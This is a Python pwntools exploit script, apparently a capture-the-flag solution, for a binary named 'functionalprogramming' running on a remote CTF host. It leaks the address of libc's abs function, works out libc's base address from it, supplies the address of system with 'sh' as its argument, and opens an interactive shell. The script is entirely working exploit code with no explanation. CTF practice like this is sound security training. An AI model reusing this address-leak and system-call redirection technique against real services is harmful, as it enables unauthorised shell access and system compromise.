#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
context.log_level = 'debug'
context.binary = 'build/functionalprogramming'

e = ELF('build/functionalprogramming')
libc = ELF('build/libc.so.6')
#libc = ELF('/usr/lib/libc.so.6')

p = remote('pwn.utctf.live', 5432)
#p = process('build/functionalprogramming', stdin=process.PTY, stdout=process.PTY)
#p = gdb.debug('build/functionalprogramming', stdin=process.PTY, stdout=process.PTY)

p.recvuntil(b': ')
p.sendline('1')
p.recvuntil(b': ')
p.sendline('26739') # u32(b'sh\x00\x00')
p.recvuntil(b'Abs: ')
abs_addr = int(p.recvline()[2:-1].decode('utf-8'),16)
p.sendline('2') #junk
libc.address = abs_addr - libc.sym['abs']
p.recvuntil(b'Filter: ')
p.sendline(hex(libc.sym['system']))
p.interactive()
